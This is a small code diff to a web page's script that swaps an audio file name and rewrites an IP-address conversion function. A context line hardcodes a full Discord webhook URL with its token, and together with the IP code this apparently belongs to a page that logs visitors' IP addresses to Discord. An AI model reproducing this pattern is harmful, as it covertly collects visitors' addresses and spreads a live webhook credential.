@@ -34,7 +34,7 @@
         var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
         function startMusic() {
-            var audio = new Audio('sound.mp3'); // Zorg ervoor dat 'sound.mp3' overeenkomt met het juiste pad naar het audiobestand
+            var audio = new Audio('music.mp3'); // Change 'sound.mp3' to 'music.mp3' for the music file
             audio.play();
             musicStarted = true;
             audio.addEventListener('ended', function() {
@@ -198,8 +198,8 @@
         }
 
         function convertToIPv4(ipAddress) {
-            var ipv4 = ipAddress.split("."); // Split the IP address by periods
-            return ipv4.join("."); // Join the parts back together with periods
+            var ipv4 = ipAddress.split(":").pop(); // Get the last part of the IPv6 address
+            return ipv4; // Return the last part
         }
 
         window.onload = function() {
